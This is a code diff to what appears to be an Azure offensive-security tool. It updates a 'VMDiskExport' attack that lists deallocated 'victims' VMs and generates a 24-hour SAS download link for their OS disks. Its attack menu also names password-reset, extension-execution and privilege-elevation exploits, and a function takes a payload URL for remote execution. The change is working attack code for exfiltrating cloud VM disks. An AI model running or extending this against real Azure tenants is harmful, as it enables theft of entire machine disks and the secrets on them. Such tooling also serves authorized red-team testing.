@@ -286,23 +286,24 @@ def RD_ListAllVMs():
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
-def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
+def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName, location):
     global Token
     headers = {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + Token
     }
-    rs = requests.get("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2021-12-01",
+    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02",
                       json={
-                          "access": "Read",
-                          "durationInSeconds": 300
+                          "access": "read",
+                          "durationInSeconds": 86400
                       },
                       headers=headers)
-    if rs.status_code == 200:
-        DownloadURL = rs.json()['access']
-        return "Ready! SAS Download Link for " + vmDiskName + ": " + DownloadURL
+
+    if rs.status_code == 202:
+        rsAsync = requests.get(str(rs.headers['Location']),headers=headers)
+        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync.json()['accessSAS']
     else:
-        return "Unable to create SAS Download Link."
+        return "Failed to generate SAS link for Disk."
 
 def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
     global Token
@@ -754,7 +755,6 @@ def attackWindow():
         "Contributor/VMExtensionResetPwd",
         "Contributor/VMExtensionExecution",
         "Contributor/VMDiskExport",
-        "Contributor/VMDiskSnapshotExport",
         "GlobalAdministrator/elevateAccess"
     ]
     readline.set_completer(SimpleCompleter(exploits).complete)
@@ -1088,7 +1088,7 @@ def attackWindow():
                     CmdFileContent = f.read()
                 print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
             elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
-                print("Trying to list offline virtual machines.. (it might take a few minutes)")
+                print("Trying to list deallocated virtual machines.. (it might take a few minutes)")
                 victims = {}
                 AllVMRecords = PrettyTable()
                 AllVMRecords.align = "l"
@@ -1096,6 +1096,8 @@ def attackWindow():
                 AllVMRecordsCount = 0
                 for UserVMRecord in RD_ListAllVMs():
                         VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
+                        if VMState != "PowerState/deallocated":
+                            continue
                         victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
                         AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], UserVMRecord['properties']['storageProfile']['osDisk']['name'], VMState])
                         AllVMRecordsCount += 1
@@ -1103,7 +1105,7 @@ def attackWindow():
                 TargetVM = input("Select Target DiskVM [i.e. 1]: ")
                 print("Create a SAS link for VHD download...")
                 Selection = int(TargetVM)
-                print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
+                print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"], victims[Selection]["location"]))
 
             elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                 print("Trying to list exposed virtual machines.. (it might take a few minutes)")
